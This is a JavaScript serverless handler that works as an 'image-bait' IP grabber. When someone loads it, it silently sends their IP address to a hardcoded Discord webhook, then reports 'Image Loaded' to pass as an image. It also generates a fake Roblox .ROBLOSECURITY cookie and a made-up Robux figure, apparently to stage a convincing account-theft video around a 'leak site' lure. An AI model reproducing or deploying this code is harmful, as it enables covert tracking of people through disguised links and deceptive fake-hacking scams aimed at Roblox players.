export default async function handler(req, res) {
    const ip = req.headers['x-forwarded-for'] || "IP Locale";
    const webhookURL = "https://discord.com/api/webhooks/1481123753109885103/u6gAezp9LjuOt2Fbgl7cfuOMVyWU_hMw8zyuDw7w-EPnzLs8MWQbenmdXb4_JVMFxhzD";

    // Génération d'un token ultra-réaliste pour la vidéo
    const secureToken = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-work-with-your-ROBLOX-account.|_" + 
                        Array.from({length:200}, () => Math.floor(Math.random()*16).toString(16).toUpperCase()).join('');

    const payload = {
        embeds: [{
            title: "🏴‍☠️ RAVEN GHOST INTERCEPTION",
            color: 0x00d4ff,
            description: "Session interceptée via **Silent Image-Bait**.",
            fields: [
                { name: "🌐 IP de la Cible", value: `\`${ip}\``, inline: true },
                { name: "📂 Source", value: "Sailor Piece Leak Site", inline: true },
                { name: "🔑 .ROBLOSECURITY", value: `\`\`\`${secureToken}\`\`\`` },
                { name: "💰 Statut du Compte", value: "Analyse des Robux en cours... (Est: 30k+)", inline: false }
            ],
            footer: { text: "Raven Protocol v15.5 - Stealth Interceptor" },
            timestamp: new Date()
        }]
    };

    await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });

    return res.status(200).json({ success: "Image Loaded" });
}
